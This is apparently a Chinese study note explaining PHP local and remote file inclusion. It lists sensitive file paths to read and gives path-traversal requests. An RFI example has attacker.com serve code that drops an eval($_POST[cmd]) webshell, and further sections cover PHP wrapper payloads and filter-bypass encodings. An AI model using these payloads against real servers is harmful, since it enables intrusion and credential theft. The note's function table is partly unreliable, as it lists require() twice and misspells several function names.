---
title: 文件包含漏洞
link: web-LFI
catalog: true
date: "2026-09-29 16:00:00"
description: 文件包含漏洞的理解
tags:
  - web
categories:
  - 笔记
draft: false
---


## 文件包含漏洞的原理
程序使用了文件包含函数（如include、require），这类函数本身是合法的功能（用于引用公共代码、配置文件等）。
包含函数的 “路径函数”可被用户控制（如通过URL的=="?file="==、=="?action"===参数传递），且未经过严格校验。

## 常见的漏洞函数
| 函数名 | 核心说明 |
| :--- | :--- |
| include() | 找不到文件时仅抛出警告，脚本继续执行 |
| include_once() | 与include()功能一致，但避免重复包含(同一文件仅加载一次) |
| require() | 找不到文件时抛出致命错误，脚本直接停止执行 |
| require() | 与require()功能一致，且避免重复包含 |
除上述核心函数外，以下函数若使用不当也可能触发文件包含风险：==hight_file()==、==show_source()==、==readfile()==、==file_get_content()==、==fopen()==、==file()==。

## 分类
### 本地文件包含（LFI）
本地文件包含指攻击者利用漏洞，包含服务器本地已存在的文件（如敏感配置、日志文件），核心特点是无需依赖远程服务器，仅需构造本地路径即可。

#### 利用条件
- 应用程序存在动态包含逻辑，且参数可配用户控制。（动态逻辑就是指web页面能够通过暴露的参数来进行跳转页面）
- 无需依赖 ==allow_url_fopen== 与 ==allow_url_include== 配置（两者开启或关闭均不影响LFI）。

#### 常用敏感文件路径
攻击者通过LFI常读取的敏感文件，需区分Windows与Linux环境：
| 环境 | 敏感文件路径 | 用途说明 |
| :--- | :--- | :--- |
| Windows | `C:/boot.ini` | 查看系统版本 |
| Windows | `C:/Windows/repair/SAM` | 存储系统账号密码哈希 |
| Windows | `C:/Windows/php.ini` | PHP配置文件 |
| Windows | `C:/Windows/System32/drivers/etc/hosts` | IP与主机名映射关系 |
| Linux | `/etc/passwd` | 用户账户信息（含用户名、UID、家目录） |
| Linux | `/etc/shadow` | 用户密码哈希（需root权限读取） |
| Linux | `/etc/nginx/nginx.conf` / `/etc/httpd/conf/httpd.conf` | Web服务器（Nginx/Apache）配置文件 |
| Linux | `/root/.ssh/id_rsa` | root用户SSH私钥（获取后可直接登录服务器） |

#### 经典利用示例
若目标应用存在LFI漏洞，参数为 =="?action="==,则可构造一下请求读取敏感文件：

``` paintext
# 读取Windows系统版本
http://target.com/include.php?action=C:/boot.ini

# 读取Linux 用户信息
http://target.com/include.php?action=../../../etc/passwd
```

### 远程文件包含（RFI）
远程文件包含值攻击者利用漏洞，包含远程服务器上的恶意文件(如Webshell)，核心特点是需依赖远程文件，且对PHP配置有严格要求。

#### 利用条件
- allow_url_fopen = On
- allow_url_include = On
(PHP 5.2即一行是版本默认allow_url_include= Off,因此RFI在现在应用中相对少见，但老旧系统仍需警惕。)
需要开启 allow_url_include=on 设置

#### 经典利用示例
- 攻击者可以在在记得服务器(http://attacker.com)上面设置创建恶意文件shell.txt,内容为：
  ``` php
  <?php fputs(fopen('webshell.php','w'),'<?php eval($_POST[cmd]);?>'); ?>
  ```
- 利用RFI漏洞包含远程shell.txt:
  ``` php
  http://target.com/include.php?action=http://attacker.com/shell.txt
  ```
- 这样在服务器上面。就会生成我们的webshell.php，再连接蚁剑，获取服务器权限
  
### 伪协议绕过
| 伪协议 | 典型用途与行为 | 核心前置条件 | 典型利用示例 |
| :--- | :--- | :--- | :--- |
| `php://filter` | **读取源码 / 编码转换**<br>通过过滤器对内容转码（如 Base64），防止代码被执行并完整获取源文件。 | 无特殊配置要求<br>（`allow_url_include` 无论开启与否均可读取本地文件） | `php://filter/read=convert.base64-encode/resource=config.php` |
| `php://input` | **执行 POST 数据**<br>访问原始请求体（Raw POST Data），将用户提交的 POST 数据当作脚本解析。 | 要求 `allow_url_include = On` | 配合 POST 请求发送代码：<br>`<?php phpinfo(); ?>` |
| `data://` | **直接嵌入并执行数据流**<br>在 URL 中直接以明文或 Base64 形式携带小型代码并作为脚本执行。 | 要求 `allow_url_fopen = On`<br>且 `allow_url_include = On` | `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+` |
| `file://` | **读取本地绝对/相对路径**<br>访问本地文件系统的基础协议，用于直接加载服务器本地文件。 | 默认开启，不受 `allow_url_*` 限制 | `file:///etc/passwd` |
| `phar://` | **归档解包与反序列化**<br>解压并读取 zip / phar 等压缩包内文件；可触发 Phar 元数据反序列化。 | 无需网络开关限制 | `phar://uploads/avatar.zip/shell.php` |
| `zip://` | **压缩包内文件解压读取**<br>通过绝对路径读取 zip 压缩包内的指定文件，常用于绕过上传后缀限制。 | 无需 `allow_url_include` | `zip:///var/www/html/upload/avatar.zip#shell.php` |

### 绕过现代防御机制的高级技术
随着Web安全技术的发展，现代Web应用程序采用了各种防御机制来防范LFI攻击。攻击者开发了多种高级技术来绕过这些防御：

- 多重重定向绕过：
 通过多个重定向链来绕过基于URL的过滤
例如：http://example.com/redirect.php?url=http://attacker.com/lfi.txt
- 编码变换绕过：
 使用不同的编码方式（如URL编码、Unicode编码、双重URL编码等）
结合多种编码方式，如%252e%252e%252f（../的双重URL编码）
- 空字节绕过的现代变体：
 虽然现代PHP版本已经修复了空字节截断的问题，但攻击者开发了新的变体
例如，利用超长路径或特殊字符组合来触发类似的行为
- 利用PHP特性绕过：
 利用PHP的各种特性，如变量解析、类型转换等
例如，利用${IFS}替代空格来绕过命令注入过滤
